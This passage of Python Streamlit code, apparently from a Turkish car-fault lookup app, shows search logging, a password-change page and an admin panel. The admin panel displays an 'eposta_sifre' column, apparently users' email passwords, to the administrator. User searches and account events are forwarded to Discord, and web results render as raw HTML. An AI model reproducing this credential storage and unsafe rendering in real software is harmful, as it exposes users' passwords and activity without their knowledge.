                (st.session_state.aktif_kullanici, aranan, bulunan_sayisi),
            )
            conn.commit()
        except Exception as e:
          st.error(f"Hata: {e}")

        # Genişletilmiş Kronik Sorunlar Bilgi Bankasından Yanıt Al
        web_arastirma_sonucu = internetten_arac_ve_veri_arastir(aranan)

        # Araba analizleri veritabanına kaydet
        try:
          with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
            cursor = conn.cursor()
            cursor.execute(
                """
                        INSERT INTO araba_analizleri (kullanici, arac_bilgisi, butce_amac, analiz_sonucu)
                        VALUES (?, ?, ?, ?)
                    """,
                (
                    st.session_state.aktif_kullanici,
                    aranan,
                    "AUTO-LAB Genişletilmiş Kronik Modülü",
                    web_arastirma_sonucu,
                ),
            )
            conn.commit()
        except Exception:
          pass

        # Discorda raporu gönder
        discorda_mesaj_gonder(
            f"🔍 **Genişletilmiş Kronik Arıza Sorgusu:**\n"
            f"👤 **Kullanıcı:** `{st.session_state.aktif_kullanici}`\n"
            f"🔎 **Aranan:** `{aranan}`\n"
            f"📄 **Özet Sonuç:**\n{web_arastirma_sonucu}"
        )

        st.markdown(
            f"""
                <div class="dashboard-card">
                    <h3>🤖 Kronik Arıza ve Eksper Raporu</h3>
                    {web_arastirma_sonucu.replace(chr(10), '<br>')}
                </div>
                """,
            unsafe_allow_html=True,
        )

  elif sekme == "⚙️ Şifremi Güncelle":
    st.markdown(
        """
        <div class="dashboard-card">
            <h3>⚙ Hesap Güvenliği ve Şifre Güncelleme</h3>
            <p style='font-size: 14px;'>Mevcut şifrenizi girerek yeni hesap şifrenizi güvenle güncelleyebilirsiniz.</p>
        </div>
        """,
        unsafe_allow_html=True,
    )

    eski_sifre = st.text_input("Mevcut Şifreniz:", type="password")
    yeni_sifre_1 = st.text_input("Yeni Şifreniz:", type="password")
    yeni_sifre_2 = st.text_input("Yeni Şifreniz (Tekrar):", type="password")

    st.markdown("<br>", unsafe_allow_html=True)
    if st.button("Şifreyi Güncelle", use_container_width=True):
      if yeni_sifre_1 == yeni_sifre_2 and yeni_sifre_1.strip():
        if st.session_state.is_admin:
          st.warning(
              "⚠ Yönetici (`ADMIN`) ana şifresi bu ekrandan"
              " değiştirilemez."
          )
        else:
          try:
            with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
              cursor = conn.cursor()
              cursor.execute(
                  "SELECT sifre FROM kullanicilar WHERE kullanici_adi = ?",
                  (st.session_state.aktif_kullanici,),
              )
              row = cursor.fetchone()
              if row and row[0] == sifre_hashle(eski_sifre):
                cursor.execute(
                    "UPDATE kullanicilar SET sifre = ? WHERE"
                    " kullanici_adi = ?",
                    (
                        sifre_hashle(yeni_sifre_1),
                        st.session_state.aktif_kullanici,
                    ),
                )
                conn.commit()
                discorda_mesaj_gonder(
                    f"🔑 **Şifre Değişikliği:** `{st.session_state.aktif_kullanici}`"
                    " kullanıcısı şifresini güncelledi."
                )
                st.success("Şifreniz başarıyla güncellendi!")
              else:
                st.error("Mevcut şifre hatalı!")
          except Exception as e:
            st.error(f"Hata: {e}")
      else:
        st.error("Yeni şifreler uyuşmuyor!")

  elif sekme == "🛡 Admin Paneli":
    if not st.session_state.is_admin:
      st.warning("⚠ Bu alana sadece ADMIN yetkisi olanlar erişebilir.")
    else:
      st.markdown(
          """
            <div class="dashboard-card">
                <h3>🛡️ Sistem Yönetim ve Log Paneli</h3>
                <p style='font-size: 14px;'>Duyuru yayınlayabilir, kullanıcıların kalan işlem haklarını ve şifrelerini yönetebilir, ayrıca arama ve kronik arıza sorgu loglarını inceleyebilirsiniz.</p>
            </div>
            """,
          unsafe_allow_html=True,
      )

      # Duyuru Alanı
      yeni_duyuru = st.text_input("Yeni Duyuru Metni:")
      if st.button("Duyuruyu Yayınla", use_container_width=True):
        if yeni_duyuru.strip():
          with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO announcements (message) VALUES (?)",
                (yeni_duyuru.strip(),),
            )
            conn.commit()
          discorda_mesaj_gonder(
              f"📢 **Yeni Duyuru Yayınlandı:** {yeni_duyuru.strip()}"
          )
          st.success("Duyuru yayınlandı!")

      st.markdown("<br>---<br>", unsafe_allow_html=True)
      st.markdown("### 👥 Kayıtlı Kullanıcılar ve İşlem Hakları Yönetimi")

      try:
        with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
          df_kullanicilar = pd.read_sql_query(
              "SELECT id, ad, soyad, eposta, eposta_sifre, kullanici_adi,"
              " is_banned, islem_hakki, kayit_tarihi FROM kullanicilar",
              conn,
          )
          if not df_kullanicilar.empty:
            st.dataframe(df_kullanicilar, use_container_width=True)

            st.markdown("<br>", unsafe_allow_html=True)
            st.markdown("#### ⚙️ Kullanıcı İşlem & Şifre Yönetimi")
            secilen_kullanici = st.selectbox(
                "İşlem Yapılacak Kullanıcıyı Seç:",
                df_kullanicilar["kullanici_adi"].tolist(),
            )

            col_adm1, col_adm2 = st.columns(2)
            with col_adm1:
              yeni_gecici_sifre = st.text_input(
                  "Yeni Şifre Belirle:", type="password", key="admin_yeni_sifre"
              )
              if st.button(
                  "Seçilen Kullanıcının Şifresini Güncelle",
                  use_container_width=True,
              ):
                if yeni_gecici_sifre.strip():
                  cursor = conn.cursor()
                  cursor.execute(
                      "UPDATE kullanicilar SET sifre = ? WHERE"
                      " kullanici_adi = ?",
                      (
                          sifre_hashle(yeni_gecici_sifre.strip()),
                          secilen_kullanici,
                      ),
                  )
                  conn.commit()
                  st.success(
                      f"'{secilen_kullanici}' kullanıcısının şifresi"
                      " güncellendi!"
                  )
                  discorda_mesaj_gonder(
                      f"🛡️ **Admin Şifre Güncellemesi:** Admin,"
                      f" `{secilen_kullanici}` kullanıcısının şifresini"
                      " değiştirdi."
                  )
                else:
                  st.error("Lütfen geçerli bir şifre girin!")

            with col_adm2:
              st.write("")
              st.write("")
              if st.button(
                  "🚫 Seçilen Kullanıcıyı Sil / Banla",
                  use_container_width=True,
              ):
                cursor = conn.cursor()
                cursor.execute(
                    "UPDATE kullanicilar SET is_banned = 1 WHERE"
                    " kullanici_adi = ?",
                    (secilen_kullanici,),
                )
                conn.commit()
                st.warning(f"'{secilen_kullanici}' kullanıcısı yasaklandı!")
                discorda_mesaj_gonder(
                    f"🚫 **Admin Yasaklama:** Admin, `{secilen_kullanici}`"
                    " kullanıcısının erişimini engelledi."
                )

            # Arama Geçmişi Logları
            st.markdown("<br>---<br>", unsafe_allow_html=True)
            st.markdown("### 📋 Kullanıcı Arama Geçmişi Logları")
            df_arama_log = pd.read_sql_query(
                "SELECT id, kullanici, aranan_kelime, bulunan_sonuc_sayisi,"
                " tarih FROM arama_gecmisi ORDER BY id DESC LIMIT 50",
                conn,
            )
            if not df_arama_log.empty:
              st.dataframe(df_arama_log, use_container_width=True)
            else:
              st.info("Henüz arama geçmişi bulunmuyor.")

            # Araç Analizi Logları
            st.markdown("<br>---<br>", unsafe_allow_html=True)
            st.markdown("### 🌐 Kronik Arıza Sorgu Logları")
            df_analiz_log = pd.read_sql_query(
                "SELECT id, kullanici, arac_bilgisi, butce_amac, tarih FROM"
                " araba_analizleri ORDER BY id DESC LIMIT 50",
                conn,
            )
            if not df_analiz_log.empty:
              st.dataframe(df_analiz_log, use_container_width=True)
            else:
              st.info("Henüz analiz geçmişi bulunmuyor.")

          else:
            st.info("Sistemde kayıtlı kullanıcı bulunmuyor.")
      except Exception as e:
        st.error(f"Veritabanı yüklenirken hata oluştu: {e}")
